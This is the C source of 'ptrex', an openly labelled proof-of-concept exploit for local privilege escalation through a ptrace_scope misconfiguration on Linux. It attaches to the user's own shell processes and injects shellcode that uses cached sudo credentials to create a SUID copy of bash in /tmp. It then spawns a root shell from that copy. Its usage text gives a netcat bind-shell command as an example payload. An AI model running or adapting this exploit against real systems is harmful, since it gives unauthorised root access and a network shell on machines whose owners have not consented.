#define PTREX_VER "v0.3-beta"

/*
ptrex - MIT License - Copyright 2020

David Reguera Garcia aka Dreg - dreg@fr33project.org
http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
IN THE SOFTWARE.

ptrace misconfiguration Local Privilege Escalation

using ptrace (no GDB dep) execve

WARNING! this is a POC, the code is CRAP

based from (GDB dep): https://www.exploit-db.com/exploits/46989
'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)
*/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h> 
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>
#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#include <stdbool.h>

// D r e g    crap shellcodes x)
unsigned char shellcode64[] = "\x6a\x00\xe8\x9d\x01\x00\x00\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x20\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x65\x63\x68\x6f\x20\x7c\x20\x73\x75\x64\x6f\x20\x2d\x53\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2f\x74\x6d\x70\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x7c\x20\x73\x75\x64\x6f\x20\x2d\x53\x20\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x62\x61\x73\x68\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x22\x29\x3b\x20\x69\x6d\x70\x6f\x72\x74\x20\x70\x74\x79\x3b\x20\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x22\x29\x3b\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe8\x03\x00\x00\x00\x2d\x63\x00\x48\x8d\x05\x21\x00\x00\x00\x50\x48\x31\xd2\x48\x89\xe6\x48\x8d\x3d\x13\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42";

unsigned char shellcode32[] = "\x6a\x00\xe8\x9d\x01\x00\x00\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x20\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x65\x63\x68\x6f\x20\x7c\x20\x73\x75\x64\x6f\x20\x2d\x53\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2f\x74\x6d\x70\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x7c\x20\x73\x75\x64\x6f\x20\x2d\x53\x20\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x62\x61\x73\x68\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x22\x29\x3b\x20\x69\x6d\x70\x6f\x72\x74\x20\x70\x74\x79\x3b\x20\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x22\x29\x3b\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe8\x03\x00\x00\x00\x2d\x63\x00\xe8\xa2\x00\x00\x00\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8d\x0c\x24\x8b\x1c\x24\x31\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80";

#pragma pack(push, 1)
typedef struct elfhdr_s
{
	unsigned char tag[4];
	unsigned char elfclass;
} elfhdr_t;
#pragma pack(pop)

typedef enum elf_plat_e
{
   ELF_PLAT_UNK,
   ELF_PLAT_32,
   ELF_PLAT_64
} elf_plat_t;

elf_plat_t GetElfPlat(pid_t pid)
{
#define ELFTAG "\x7F" "ELF"
    char proc_path[200] = { 0 };
    FILE* file = NULL;
    elfhdr_t elf = { 0 };
    elf_plat_t retf = ELF_PLAT_UNK;

    sprintf(proc_path, "/proc/%d/exe", pid);

    file = fopen(proc_path, "rb");
    if (NULL == file)
    {
        perror(proc_path);
        return ELF_PLAT_UNK;
    }

    fread(&elf, sizeof(elf), 1, file);

    if (memcmp(&elf, ELFTAG, sizeof(ELFTAG) - 1) != 0)
    {
        printf("NOT ELF");
    }

    printf("elf plat: ");
    if (elf.elfclass == 1)
    {
        puts("32");
        retf = ELF_PLAT_32;
    }
    else
    {
        puts("64");
        retf = ELF_PLAT_64;
    }

    fclose(file);

    return retf;
}

int CheckScope(void)
{
  char status[3] = { 0 };
  FILE* file;
  int retf = -1;

  #define SCOPE_PATH "/proc/sys/kernel/yama/ptrace_scope"

  file = fopen(SCOPE_PATH, "r");
  if (NULL == file)
  {
    perror("error opening " SCOPE_PATH);
    return -1;
  }

  if (!fgets(status, sizeof(status) - 1, file))
  {
     puts("error reading: " SCOPE_PATH);
  }
  else
  {
    retf = 0;
    printf(SCOPE_PATH " : %s\n", status);
  }

  fclose(file);

  return retf;
}

bool InjectAttachedPid(pid_t pid, elf_plat_t elf_plat)
{
#ifdef __x86_64
#define CIP_REG rip
#else
#define CIP_REG eip
#endif

  struct user_regs_struct regs = { 0 };
  int syscall = 0;
  long dst = 0;
  int i = 0;
  uint32_t* s = NULL;
  uint32_t* d = NULL;
  size_t size_shellcode = 0;

  printf ("getting registers\n");
  if ((ptrace (PTRACE_GETREGS, pid, NULL, &regs)) < 0)
  {
    perror ("ptrace(GETREGS):");
    return false;
  }

  if (ELF_PLAT_64 == elf_plat)
  {
#ifdef __x86_64
    printf("injecting shellcode at: 0x%016" PRIx64 "\n", (uint64_t)regs.CIP_REG);
    d = (uint32_t *) regs.CIP_REG;
#else
    printf("warning: ptrex compiled as 32 bit cant inject in a 64 bit process, skipping pid %d\n", pid);
    return false;
#endif
    s = (uint32_t *) shellcode64;
    size_shellcode = sizeof(shellcode64) - 1;
  }
  else
  {
    printf("injecting shellcode at: 0x%08" PRIx32 "\n", (uint32_t)regs.CIP_REG);
    s = (uint32_t *) shellcode32;
    d = (uint32_t *) regs.CIP_REG;
    size_shellcode = sizeof(shellcode32) - 1;
  }

  for (i = 0; i < size_shellcode; i += 4, s++, d++)
  {
    if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
    {
      perror ("ptrace(POKETEXT):");
      return false;
    }
  }

  if (ELF_PLAT_64 == elf_plat)
  {
    printf ("setting instruction pointer to: 0x%016" PRIx64 "\n", (uint64_t)regs.CIP_REG);
  }
  else
  {
    printf ("setting instruction pointer to: 0x%08" PRIx32 "\n", (uint32_t)regs.CIP_REG);
  }

  regs.CIP_REG += 2;
  if ((ptrace (PTRACE_SETREGS, pid, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      return false;
    }

  return true;
}

bool InjectPid(pid_t pid, elf_plat_t elf_plat)
{
  bool retf = false;

  if ((ptrace (PTRACE_ATTACH, pid, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      return false;
    }

  printf ("waiting for process\n");
  wait (NULL);

  retf = InjectAttachedPid(pid, elf_plat);
  if (retf)
  {
    printf("runing\n");
  }

  if ((ptrace (PTRACE_DETACH, pid, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  return false;
	}

  return retf;
}


bool PyPath(char* pypath)
{
    #define PATPYTSR "/bin/python"
    #define SIZE_NEW_PY 150
    void* ptr64 = NULL;
    void* ptr32 = NULL;
    size_t sizec = 0;

    ptr64 = memmem((void*)shellcode64, sizeof(shellcode64) - 1, (void*)PATPYTSR, sizeof(PATPYTSR) - 1);
    ptr32 = memmem((void*)shellcode32, sizeof(shellcode32) - 1, (void*)PATPYTSR, sizeof(PATPYTSR) - 1);

    if (NULL == ptr64 || NULL == ptr32)
    {
        puts("error PATPYTSR");
        return false;
    }

    if (NULL == pypath)
    {
        printf("using default python path sc32: %s\n", ptr32);
        printf("using default python path sc64: %s\n", ptr64);
        return true;
    }

    sizec = strlen(pypath);

    if (strlen(pypath) > SIZE_NEW_PY)
    {
        printf("error: new python path size is greater than %d\n", SIZE_NEW_PY);
        return false;
    }

    printf("replacing sc32: %s\n", ptr32);
    printf("replacing sc64: %s\n", ptr64);
    memcpy(ptr32, pypath, sizec + 1);
    memcpy(ptr64, pypath, sizec + 1);
    printf("new sc32: %s\n", ptr32);
    printf("new sc64: %s\n", ptr64);

    return true;
}

bool Cdline(char* new_cmd_line)
{
    #define PATTSR "import os;"
    #define SIZE_NEW_LI 250
    void* ptr64 = NULL;
    void* ptr32 = NULL;
    size_t sizec = 0;

    ptr64 = memmem((void*)shellcode64, sizeof(shellcode64) - 1, (void*)PATTSR, sizeof(PATTSR) - 1);
    ptr32 = memmem((void*)shellcode32, sizeof(shellcode32) - 1, (void*)PATTSR, sizeof(PATTSR) - 1);

    if (NULL == ptr64 || NULL == ptr32)
    {
        puts("error PATTSR");
        return false;
    }

    if (NULL == new_cmd_line)
    {
        printf("using default cmd line sc32: %s\n", ptr32);
        printf("using default cmd line sc64: %s\n", ptr64);
        return true;
    }

    sizec = strlen(new_cmd_line);

    if (strlen(new_cmd_line) > SIZE_NEW_LI)
    {
        printf("error: new_cmd_line size is greater than %d\n", SIZE_NEW_LI);
        return false;
    }

    printf("replacing sc32: %s\n", ptr32);
    printf("replacing sc64: %s\n", ptr64);
    memcpy(ptr32, new_cmd_line, sizec + 1);
    memcpy(ptr64, new_cmd_line, sizec + 1);
    printf("new sc32: %s\n", ptr32);
    printf("new sc64: %s\n", ptr64);

    return true;
}

bool file_exists (char *filename) {
  struct stat buffer = { 0 };

  return (stat (filename, &buffer) == 0);
}

void  SpawnRootShell(void)
{
    #define SUID_SHELL_PATH "/tmp/bash"
    #define SYSC "/tmp/bash -p -c 'rm /tmp/bash ; tput cnorm && /bin/bash -p'"
    int i = 0;
    for (i = 0; i < 4; i++)
    {
        puts("please wait...");
        sleep(1);
    	if (!file_exists(SUID_SHELL_PATH))
    	{
        	return;
    	}
        else
        {
          puts("found suid shell: " SUID_SHELL_PATH);
          puts("rooting..... \n" SYSC "\n");
          sleep(2);
          system(SYSC);
          return;
        }
    }

    puts("bad luck, suid shell dont found!\n");
}

int main(int argc, char *argv[])
{
  char buffer[100] = { 0 };
  pid_t pid = 0;
  pid_t own_shell_pid = 0;
  elf_plat_t elf_plat = 0;

  puts("ptrex " PTREX_VER " - MIT License - Copyright 2020\n"
	"David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
        "http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/\n"
        "-\n"
        "ptrace misconfiguration Local Privilege Escalation\n"
        "using ptrace (no GDB dep) execve\n"
        "-\n"
        "Based from: https://www.exploit-db.com/exploits/46989\n"
        "'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)\n");

  puts("To change default python path & cmd injected: ./ptrex full_python_path newcmdline\n"
       "    example: ./ptrex /home/dreg/tmp/python 'import os; os.system(\"/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash\")'\n");

   if (argc > 2)
   {
       if (!PyPath(argv[1]))
       {
         return 1;
       }
       if (!Cdline(argv[2]))
       {
         return 1;
       }
   }

  #define RCSH "pgrep \"^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\\n' '|'))$\" -u \"$(id -u)\" | sed '$ d'"

  CheckScope();

  puts(RCSH);
  FILE* pids = popen(RCSH, "r");
  if (NULL == pids)
  {
    perror("");
    return 1;
  }

  own_shell_pid = getppid();
  while (fgets(buffer, sizeof(buffer) - 1, pids))
  {
    pid = atoi(buffer);
//    pid = 14805;
    printf("current pid: %d\n", pid);
    if (pid != own_shell_pid)
    {
      elf_plat = GetElfPlat(pid);
      InjectPid(pid, elf_plat);
//       exit(1);
    }
    else
    {
      printf("skipping current shell pid: %d\n", pid);
    }

    memset(buffer, 0, sizeof(buffer));
  }

  if (argc < 2)
  {
    SpawnRootShell();
  }

  pclose(pids);

  return 0;
}
